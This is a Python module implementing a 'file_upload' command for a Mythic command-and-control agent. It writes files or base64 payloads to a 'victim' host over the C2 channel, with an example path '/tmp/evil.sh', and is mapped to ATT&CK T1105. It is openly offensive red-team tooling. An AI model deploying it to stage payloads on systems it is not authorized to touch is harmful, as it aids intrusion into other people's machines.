import base64
import importlib

from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


def _set_arg(task, name: str, value) -> None:
    """Update an existing TaskArguments parameter value by direct mutation.
    task.args.add_arg() silently fails when the parameter is already defined;
    mutating .value directly is the reliable alternative.
    """
    for arg in (task.args.args or []):
        if getattr(arg, 'name', None) == name:
            arg.value = value
            return
    # Not found — add it fresh
    try:
        task.args.add_arg(name, value)
    except Exception:
        pass


async def _fetch_file_b64(file_id: str) -> str:
    """Retrieve file contents from Mythic storage.

    Primary: internal HTTP to mythic_server (same Docker network, no auth needed,
             no RPC class-name guessing, works across all Mythic versions).
    Fallback: RPC dynamic discovery (tries all File-related classes).
    """
    import os, urllib.request

    # ── 1. Internal HTTP download (most reliable) ────────────────────────────
    hosts = list(dict.fromkeys(filter(None, [
        os.environ.get('MYTHIC_ADDRESS'),
        os.environ.get('MYTHIC_SERVER_HOST'),
        'mythic_server',   # standard Docker service name
        '127.0.0.1',
    ])))
    ports = list(dict.fromkeys(filter(None, [
        os.environ.get('MYTHIC_PORT'),
        os.environ.get('MYTHIC_SERVER_PORT'),
        '17444', '7443',
    ])))

    def _http_download(url: str) -> bytes:
        # timeout=(connect, read) — internal Docker network is fast;
        # read timeout of 120s supports files up to ~500 MB on a typical LAN.
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=120) as r:
            if r.status == 200:
                return r.read()
        return b''

    import asyncio as _aio
    loop = _aio.get_event_loop()
    for host in hosts:
        for port in ports:
            try:
                url = f"http://{host}:{port}/direct/download/{file_id}"
                data = await loop.run_in_executor(None, _http_download, url)
                if data:
                    return base64.b64encode(data).decode()
            except Exception:
                continue

    # ── 2. RPC fallback (dynamic class discovery) ────────────────────────────
    try:
        from mythic_container.MythicRPC import MythicRPC
        rpc_mod = importlib.import_module('mythic_container.MythicRPC')

        file_cls_names = sorted(
            n for n in dir(rpc_mod)
            if 'File' in n and callable(getattr(rpc_mod, n, None))
        )
        print(f"[file_upload] HTTP download failed; trying RPC classes: {file_cls_names}", flush=True)

        for cls_name in file_cls_names:
            cls = getattr(rpc_mod, cls_name, None)
            if cls is None:
                continue
            # Try common parameter names for file ID
            for kwargs in (
                {'AgentFileId': file_id},
                {'agent_file_id': file_id},
                {'FileId': file_id},
                {'file_id': file_id},
                {'UUID': file_id},
            ):
                try:
                    resp = await MythicRPC().execute(cls(**kwargs))
                    print(f"[file_upload] {cls_name}({kwargs}) → Success={getattr(resp,'Success',None)} attrs={[a for a in dir(resp) if not a.startswith('_')]}", flush=True)
                    if not getattr(resp, 'Success', False):
                        continue
                    # Search for file bytes in the response — handles both
                    # list-of-files (FileSearch) and direct-content patterns
                    for attr in dir(resp):
                        if attr.startswith('_'):
                            continue
                        val = getattr(resp, attr, None)
                        # List of file objects (MythicRPCFileSearch pattern)
                        if isinstance(val, list) and val:
                            fobj = val[0]
                            for c_attr in ('Contents', 'Content', 'Data', 'FileContents'):
                                raw = getattr(fobj, c_attr, None)
                                if not raw:
                                    continue
                                if isinstance(raw, (bytes, bytearray)):
                                    return base64.b64encode(raw).decode()
                                if isinstance(raw, str) and len(raw) > 4:
                                    try:
                                        base64.b64decode(raw)
                                        return raw
                                    except Exception:
                                        pass
                        # Direct bytes on response object
                        if isinstance(val, (bytes, bytearray)) and len(val) > 4:
                            return base64.b64encode(val).decode()
                        # Direct base64 string on response object
                        if isinstance(val, str) and len(val) > 64:
                            try:
                                base64.b64decode(val)
                                return val
                            except Exception:
                                pass
                except Exception as ex:
                    print(f"[file_upload] {cls_name}({kwargs}) raised: {ex}", flush=True)
                    continue
    except Exception as ex:
        print(f"[file_upload] _fetch_file_b64 outer exception: {ex}", flush=True)
    return ''


class FileUploadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="path",
                display_name="Destination Path",
                type=ParameterType.String,
                description="Full destination path on victim (e.g. /tmp/evil.sh or C:/Users/user/file.exe)",
                default_value="",
            ),
            CommandParameter(
                name="upload_file",
                display_name="File",
                type=ParameterType.File,
                description=(
                    "Select a file from your local machine. Mythic uploads it to its "
                    "encrypted storage and passes only the file ID to the agent — "
                    "file contents are never exposed in plaintext task parameters."
                ),
                default_value=None,
            ),
            CommandParameter(
                name="file_id",
                display_name="File ID (Mythic)",
                type=ParameterType.String,
                description=(
                    "Alternative to the File picker: paste a Mythic file ID directly "
                    "(from a previous upload or another task)."
                ),
                default_value="",
            ),
            CommandParameter(
                name="content_b64",
                display_name="Content (base64)",
                type=ParameterType.String,
                description=(
                    "Inline base64-encoded content. Convenient for small strings or "
                    "generated payloads. For binary files use the File picker instead."
                ),
                default_value="",
            ),
            CommandParameter(
                name="append",
                display_name="Append",
                type=ParameterType.Boolean,
                description="Append to file instead of overwriting",
                default_value=False,
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            try:
                self.load_args_from_json_string(self.command_line)
            except Exception:
                self.add_arg("path", self.command_line.strip())


class FileUploadCommand(CommandBase):
    cmd            = "file_upload"
    needs_admin    = False
    help_cmd       = (
        "file_upload  →  use the File picker in the Mythic UI to select a local file\n"
        "file_upload {\"path\": \"/tmp/x\", \"file_id\": \"<mythic-id>\"}  →  reference existing upload\n"
        "file_upload {\"path\": \"/tmp/x\", \"content_b64\": \"<base64>\"}  →  inline small payload"
    )
    description    = (
        "Write a file to the victim via native host. Three modes:\n"
        "1. File picker (recommended) — select a local file in the Mythic UI; "
        "contents are uploaded to Mythic's encrypted storage and never appear in "
        "plaintext task parameters.\n"
        "2. file_id — reference a file already registered in Mythic.\n"
        "3. content_b64 — inline base64 for small generated payloads.\n"
        "Requires native host with files or all features."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = FileUploadArguments
    attackmapping  = ["T1105"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        path        = task.args.get_arg("path") or ""
        file_id     = task.args.get_arg("file_id") or ""
        upload_file = (task.args.get_arg("upload_file") or "") or ""
        content_b64 = task.args.get_arg("content_b64") or ""
        append      = task.args.get_arg("append") or False

        resolved_fid = upload_file or file_id

        # Pass the file_id to the agent — it uses the Mythic upload protocol
        # over the existing C2 channel (WebSocket or HTTP) to retrieve the content.
        # No server-side content embedding needed.
        if resolved_fid:
            _set_arg(task, "file_id", resolved_fid)
            file_id = resolved_fid

        if content_b64:
            mode = "inline base64"
        elif file_id:
            mode = "mythic file → C2 upload protocol"
        else:
            mode = "no content"

        task.display_params = f"→ {path}  [{mode}{'  append' if append else ''}]"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
